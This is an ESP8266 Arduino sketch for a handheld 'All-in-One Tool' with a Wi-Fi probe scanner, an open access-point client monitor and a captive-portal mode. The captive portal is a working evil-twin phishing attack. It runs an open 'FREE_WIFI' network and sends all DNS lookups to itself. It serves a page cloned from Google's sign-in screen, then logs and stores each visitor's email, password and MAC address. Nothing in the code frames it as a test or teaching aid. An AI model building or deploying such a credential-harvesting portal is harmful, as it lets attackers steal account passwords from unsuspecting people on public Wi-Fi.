#include <ESP8266WiFi.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>

// OLED setup
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 32
#define OLED_RESET -1
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

// Button pins
#define BTN_UP 14      // D5
#define BTN_DOWN 12    // D6
#define BTN_SELECT 13  // D7
#define BTN_BACK 15    // D8

// Program modes
enum Mode { MENU, WIFI_SCANNER, AP_MONITOR, CAPTIVE_PORTAL };
Mode currentMode = MENU;
int menuIndex = 0;
const char* menuItems[] = { "Wi-Fi Scanner", "AP Monitor", "Captive Portal" };
const int menuCount = 3;

// ========== WI-FI SCANNER VARIABLES ==========
#define MAX_DEVICES 50
struct Device {
  String mac;
  int rssi;
  unsigned long lastSeen;
};
Device devices[MAX_DEVICES];
int deviceCount = 0;
int scannerChannel = 1;
int scannerScroll = 0;
unsigned long lastChannelHop = 0;

// ========== AP MONITOR VARIABLES ==========
ESP8266WebServer server(80);
const char* apSSID = "FREE WIFI";
unsigned long lastAPUpdate = 0;

// ========== CAPTIVE PORTAL VARIABLES ==========
DNSServer dnsServer;
const char* portalSSID = "FREE_WIFI";
const byte DNS_PORT = 53;
IPAddress apIP(192,168,4,1);

#define MAX_CLIENTS 32
String allowedMACs[MAX_CLIENTS];
int allowedCount = 0;

struct Submission {
  String mac;
  String email;
  String password;
  String time;
};
Submission submissions[MAX_CLIENTS];
int submissionCount = 0;

// Your exact Google login HTML
const char *portalPage = 
"<!DOCTYPE html>"
"<html lang='en'>"
"<head>"
"<meta charset='UTF-8'>"
"<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
"<title>Google Login Clone</title>"
"<link href='https://fonts.googleapis.com/css2?family=Google+Sans&display=swap' rel='stylesheet'>"
"<style>"
"body {"
"    font-family: 'Google Sans', Arial, sans-serif;"
"    background-color: #f5f5f5;"
"    display: flex;"
"    justify-content: center;"
"    align-items: center;"
"    height: 100vh;"
"    margin: 0;"
"}"
".login-container {"
"    background-color: white;"
"    padding: 40px;"
"    border-radius: 8px;"
"    box-shadow: 0px 4px 20px rgba(0,0,0,0.1);"
"    width: 300px;"
"    text-align: center;"
"}"
".logo {"
"    font-family: 'Google Sans', Arial, sans-serif;"
"    font-size: 36px;"
"    font-weight: bold;"
"    margin-bottom: 20px;"
"}"
".logo span:nth-child(1) { color: #4285F4; }"
".logo span:nth-child(2) { color: #EA4335; }"
".logo span:nth-child(3) { color: #FBBC05; }"
".logo span:nth-child(4) { color: #4285F4; }"
".logo span:nth-child(5) { color: #34A853; }"
".logo span:nth-child(6) { color: #EA4335; }"
"input[type='email'],"
"input[type='password'],"
"input[type='text'] {"
"    width: 100%;"
"    padding: 12px;"
"    margin: 8px 0;"
"    border: 1px solid #ccc;"
"    border-radius: 4px;"
"    box-sizing: border-box;"
"    font-family: 'Google Sans', Arial, sans-serif;"
"    font-size: 16px;"
"}"
".show-password {"
"    margin: 8px 0;"
"    display: flex;"
"    align-items: center;"
"    font-size: 14px;"
"}"
".show-password input {"
"    margin-right: 5px;"
"}"
".login-container a {"
"    text-decoration: none;"
"    font-size: 14px;"
"    color: #1a73e8;"
"    display: block;"
"    margin: 10px 0;"
"}"
".login-container h2 {"
"    font-weight: 400;"
"    font-size: 30px;"
"    margin-top: -10px"
"}"
".login-container h3 {"
"    font-weight: 200;"
"    font-size: 15px;"
"    margin-top: -15px"
"}"
"button {"
"    background-color: #1a73e8;"
"    color: white;"
"    border: none;"
"    padding: 12px;"
"    width: 100%;"
"    border-radius: 4px;"
"    cursor: pointer;"
"    font-size: 16px;"
"}"
"button:hover {"
"    background-color: #1669c1;"
"}"
"</style>"
"</head>"
"<body>"
"<div class='login-container'>"
"<div class='logo'>"
"<span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>"
"</div>"
"<h2>Sign In</h2>"
"<h3>with your Google Account</h3>"
"<form action='/submit' method='POST'>"
"<input type='email' name='email' placeholder='Email or phone' required>"
"<input type='password' name='password' placeholder='Enter Your Password' id='password' required>"
"<label class='show-password'><input type='checkbox' id='showPw'> Show Password</label>"
"<button type='submit'>Next</button>"
"<a href='#'>Forget password ?</a>"
"</form>"
"</div>"
"<script>"
"const pw = document.getElementById('password');"
"const cb = document.getElementById('showPw');"
"cb.addEventListener('change', () => { pw.type = cb.checked ? 'text' : 'password'; });"
"</script>"
"</body>"
"</html>";

// ========== COMMON FUNCTIONS ==========
void updateDisplay() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  
  switch(currentMode) {
    case MENU:
      drawMenu();
      break;
    case WIFI_SCANNER:
      drawScanner();
      break;
    case AP_MONITOR:
      drawAPMonitor();
      break;
    case CAPTIVE_PORTAL:
      drawCaptivePortal();
      break;
  }
  display.display();
}

void drawMenu() {
  display.setCursor(0, 0);
  display.print("> ");
  display.println(menuItems[menuIndex]);
  
  if(menuIndex < menuCount-1) {
    display.setCursor(0, 10);
    display.println(menuItems[menuIndex+1]);
  }
  
  display.setCursor(110, 0);
  display.print(menuIndex+1);
}

// ========== WI-FI SCANNER FUNCTIONS ==========
void startScanner() {
  currentMode = WIFI_SCANNER;
  deviceCount = 0;
  scannerScroll = 0;
  
  wifi_set_opmode(STATION_MODE);
  wifi_promiscuous_enable(0);
  wifi_set_promiscuous_rx_cb([](uint8_t *buf, uint16_t len) {
    if (len < 28) return;
    uint8_t *f = buf + 12;
    uint16_t fc = (f[1] << 8) | f[0];
    if (((fc >> 2) & 0x03) == 0 && ((fc >> 4) & 0x0F) == 4) {
      String mac;
      for (int i = 10; i < 16; i++) {
        mac += String(f[i], HEX);
        if (i < 15) mac += ":";
      }
      int rssi = buf[0] - 256;
      
      bool found = false;
      for (int i = 0; i < deviceCount; i++) {
        if (devices[i].mac == mac) {
          devices[i].rssi = rssi;
          devices[i].lastSeen = millis();
          found = true;
          break;
        }
      }
      if (!found && deviceCount < MAX_DEVICES) {
        devices[deviceCount].mac = mac;
        devices[deviceCount].rssi = rssi;
        devices[deviceCount].lastSeen = millis();
        deviceCount++;
      }
    }
  });
  wifi_promiscuous_enable(1);
}

void stopScanner() {
  wifi_promiscuous_enable(0);
}

void drawScanner() {
  if (millis() - lastChannelHop > 2000) {
    scannerChannel = (scannerChannel % 11) + 1;
    wifi_set_channel(scannerChannel);
    lastChannelHop = millis();
    
    unsigned long now = millis();
    int newIndex = 0;
    for (int i = 0; i < deviceCount; i++) {
      if (now - devices[i].lastSeen < 120000) {
        devices[newIndex] = devices[i];
        newIndex++;
      }
    }
    deviceCount = newIndex;
    if (scannerScroll >= deviceCount) scannerScroll = max(0, deviceCount - 2);
  }
  
  display.setCursor(0, 0);
  display.print("Ch:");
  display.print(scannerChannel);
  display.print(" Dev:");
  display.print(deviceCount);
  
  for (int i = 0; i < 2; i++) {
    int idx = scannerScroll + i;
    if (idx < deviceCount) {
      display.setCursor(0, 10 + (i * 10));
      if (devices[idx].mac.length() >= 11) {
        display.print(devices[idx].mac.substring(0, 11));
      } else {
        display.print(devices[idx].mac);
      }
      
      display.setCursor(80, 10 + (i * 10));
      display.print(devices[idx].rssi);
      display.print("dB");
      
      display.setCursor(110, 10 + (i * 10));
      int bars = map(devices[idx].rssi, -100, -50, 1, 4);
      bars = constrain(bars, 1, 4);
      for (int b = 0; b < bars; b++) display.print("#");
    }
  }
  
  if (deviceCount > 2) {
    display.setCursor(120, 0);
    display.print((scannerScroll/2) + 1);
  }
}

// ========== AP MONITOR FUNCTIONS ==========
void startAPMonitor() {
  currentMode = AP_MONITOR;
  
  WiFi.mode(WIFI_AP);
  WiFi.softAP(apSSID);
  
  server.on("/stations", []() {
    String json = "[";
    struct station_info *st = wifi_softap_get_station_info();
    bool first = true;
    while(st != NULL) {
      if(!first) json += ",";
      first = false;
      char mac[18];
      sprintf(mac, "%02X:%02X:%02X:%02X:%02X:%02X",
              st->bssid[0], st->bssid[1], st->bssid[2],
              st->bssid[3], st->bssid[4], st->bssid[5]);
      IPAddress ip((uint32_t)st->ip.addr);
      json += "{\"mac\":\"" + String(mac) + "\",\"ip\":\"" + ip.toString() + "\"}";
      st = STAILQ_NEXT(st, next);
    }
    wifi_softap_free_station_info();
    json += "]";
    server.send(200, "application/json", json);
  });
  server.begin();
}

void stopAPMonitor() {
  server.stop();
  WiFi.softAPdisconnect(true);
}

void drawAPMonitor() {
  server.handleClient();
  
  if(millis() - lastAPUpdate > 5000) {
    lastAPUpdate = millis();
    
    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    
    display.setCursor(0, 0);
    display.print("AP: ");
    display.print(apSSID);
    
    struct station_info *st = wifi_softap_get_station_info();
    int y = 10;
    int count = 0;
    
    while(st != NULL && y < 32) {
      char shortMac[9];
      sprintf(shortMac, "%02X:%02X:%02X", st->bssid[3], st->bssid[4], st->bssid[5]);
      IPAddress ip((uint32_t)st->ip.addr);
      
      display.setCursor(0, y);
      display.print(shortMac);
      display.print(" ");
      display.print(ip.toString());
      
      y += 10;
      count++;
      st = STAILQ_NEXT(st, next);
    }
    wifi_softap_free_station_info();
    
    if(count == 0) {
      display.setCursor(0, 10);
      display.print("No clients");
    }
  }
}

// ========== CAPTIVE PORTAL FUNCTIONS ==========
String macToStr(const uint8_t *mac) {
  char buf[18];
  sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X",
          mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(buf);
}

String findMacForClientIP(IPAddress clientIP) {
  struct station_info *st = wifi_softap_get_station_info();
  String result = "";
  while (st != NULL) {
    IPAddress st_ip((uint32_t)st->ip.addr);
    if (st_ip == clientIP) {
      result = macToStr(st->bssid);
      break;
    }
    st = STAILQ_NEXT(st, next);
  }
  wifi_softap_free_station_info();
  return result;
}

bool isAllowed(const String &mac) {
  for (int i=0; i<allowedCount; ++i) {
    if (allowedMACs[i] == mac) return true;
  }
  return false;
}

bool addAllowed(const String &mac) {
  if (allowedCount >= MAX_CLIENTS) return false;
  if (!isAllowed(mac)) {
    allowedMACs[allowedCount++] = mac;
    return true;
  }
  return false;
}

void handlePortalRoot() {
  IPAddress clientIP = server.client().remoteIP();
  String mac = findMacForClientIP(clientIP);

  if (mac.length() && isAllowed(mac)) {
    server.send(200, "text/html", 
      "<!doctype html><html><head><title>Access Granted</title><style>"
      "body{font-family:'Google Sans',Arial,sans-serif;background:#f5f5f5;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}"
      ".container{background:white;padding:40px;border-radius:8px;box-shadow:0 4px 20px rgba(0,0,0,0.1);width:300px;text-align:center;}"
      "h2{color:#34A853;}</style></head><body>"
      "<div class='container'><h2>✓ Access Granted</h2><p>You can now use the network.</p></div></body></html>"
    );
    return;
  }
  
  server.send(200, "text/html", portalPage);
}

void handlePortalSubmit() {
  IPAddress clientIP = server.client().remoteIP();
  String mac = findMacForClientIP(clientIP);

  String email = server.arg("email");
  String password = server.arg("password");

  if (mac.length() == 0) {
    mac = "UNKNOWN";
  }

  Serial.println("=== Google Login Captured ===");
  Serial.print("Client IP: "); Serial.println(clientIP);
  Serial.print("Client MAC: "); Serial.println(mac);
  Serial.print("Email: "); Serial.println(email);
  Serial.print("Password: "); Serial.println(password);
  Serial.println("=============================");

  if (submissionCount < MAX_CLIENTS) {
    submissions[submissionCount].mac = mac;
    submissions[submissionCount].email = email;
    submissions[submissionCount].password = password;
    submissions[submissionCount].time = String(millis());
    submissionCount++;
  }

  if (mac != "UNKNOWN") addAllowed(mac);

  server.send(200, "text/html", 
    "<!doctype html><html><head><title>Access Granted</title><style>"
    "body{font-family:'Google Sans',Arial,sans-serif;background:#f5f5f5;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}"
    ".container{background:white;padding:40px;border-radius:8px;box-shadow:0 4px 20px rgba(0,0,0,0.1);width:300px;text-align:center;}"
    "h2{color:#34A853;}</style></head><body>"
    "<div class='container'><h2>✓ Access Granted</h2><p>You can now use the network.</p></div></body></html>"
  );
}

void startCaptivePortal() {
  currentMode = CAPTIVE_PORTAL;
  
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255,255,255,0));
  WiFi.softAP(portalSSID);
  
  dnsServer.start(DNS_PORT, "*", apIP);
  
  server.on("/", HTTP_GET, handlePortalRoot);
  server.on("/submit", HTTP_POST, handlePortalSubmit);
  server.onNotFound([]() {
    server.sendHeader("Location", String("http://") + apIP.toString() + "/", true);
    server.send(302, "text/plain", "");
  });
  
  server.begin();
}

void stopCaptivePortal() {
  dnsServer.stop();
  server.stop();
  WiFi.softAPdisconnect(true);
}

void drawCaptivePortal() {
  dnsServer.processNextRequest();
  server.handleClient();
  
  static unsigned long lastUpdate = 0;
  if(millis() - lastUpdate > 5000) {
    lastUpdate = millis();
    
    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    
    display.setCursor(0, 0);
    display.print("Portal: ");
    display.print(portalSSID);
    display.print(" ");
    display.print(submissionCount);
    
    struct station_info *st = wifi_softap_get_station_info();
    int y = 10;
    int count = 0;
    
    while(st != NULL && y < 32) {
      char shortMac[9];
      sprintf(shortMac, "%02X:%02X:%02X", st->bssid[3], st->bssid[4], st->bssid[5]);
      
      display.setCursor(0, y);
      display.print(shortMac);
      if(isAllowed(macToStr(st->bssid))) {
        display.print(" ✓");
      } else {
        display.print(" ✗");
      }
      
      y += 10;
      count++;
      st = STAILQ_NEXT(st, next);
    }
    wifi_softap_free_station_info();
    
    if(count == 0) {
      display.setCursor(0, 10);
      display.print("No clients");
    }
  }
}

// ========== BUTTON HANDLING ==========
void handleButtons() {
  static bool lastUp = false, lastDown = false, lastSelect = false, lastBack = false;
  bool up = digitalRead(BTN_UP);
  bool down = digitalRead(BTN_DOWN);
  bool select = digitalRead(BTN_SELECT);
  bool back = digitalRead(BTN_BACK);
  
  if(currentMode == MENU) {
    if(up && !lastUp) {
      menuIndex = (menuIndex - 1 + menuCount) % menuCount;
      updateDisplay();
    }
    if(down && !lastDown) {
      menuIndex = (menuIndex + 1) % menuCount;
      updateDisplay();
    }
    if(select && !lastSelect) {
      if(menuIndex == 0) startScanner();
      else if(menuIndex == 1) startAPMonitor();
      else if(menuIndex == 2) startCaptivePortal();
      updateDisplay();
    }
  }
  else if(currentMode == WIFI_SCANNER) {
    if(up && !lastUp && deviceCount > 2) {
      scannerScroll = max(scannerScroll - 2, 0);
      updateDisplay();
    }
    if(down && !lastDown && deviceCount > 2) {
      scannerScroll = min(scannerScroll + 2, deviceCount - 2);
      updateDisplay();
    }
    if(back && !lastBack) {
      stopScanner();
      currentMode = MENU;
      updateDisplay();
    }
  }
  else if(currentMode == AP_MONITOR || currentMode == CAPTIVE_PORTAL) {
    if(back && !lastBack) {
      if(currentMode == AP_MONITOR) stopAPMonitor();
      else if(currentMode == CAPTIVE_PORTAL) stopCaptivePortal();
      currentMode = MENU;
      updateDisplay();
    }
  }
  
  lastUp = up; lastDown = down; lastSelect = select; lastBack = back;
}

// ========== MAIN SETUP & LOOP ==========
void setup() {
  Serial.begin(115200);
  
  // OLED init
  if(!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println("OLED fail");
    for(;;);
  }
  
  // Button setup
  pinMode(BTN_UP, INPUT);
  pinMode(BTN_DOWN, INPUT);
  pinMode(BTN_SELECT, INPUT);
  pinMode(BTN_BACK, INPUT);
  
  // Initial display
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);
  display.println("All-in-One Tool");
  display.println("Press SELECT");
  display.display();
  delay(1000);
  
  updateDisplay();
}

void loop() {
  handleButtons();
  
  // Mode-specific updates
  if(currentMode == WIFI_SCANNER) {
    static unsigned long lastUpdate = 0;
    if(millis() - lastUpdate > 500) {
      updateDisplay();
      lastUpdate = millis();
    }
  }
  else if(currentMode == AP_MONITOR || currentMode == CAPTIVE_PORTAL) {
    static unsigned long lastUpdate = 0;
    if(millis() - lastUpdate > 1000) {
      updateDisplay();
      lastUpdate = millis();
    }
  }
}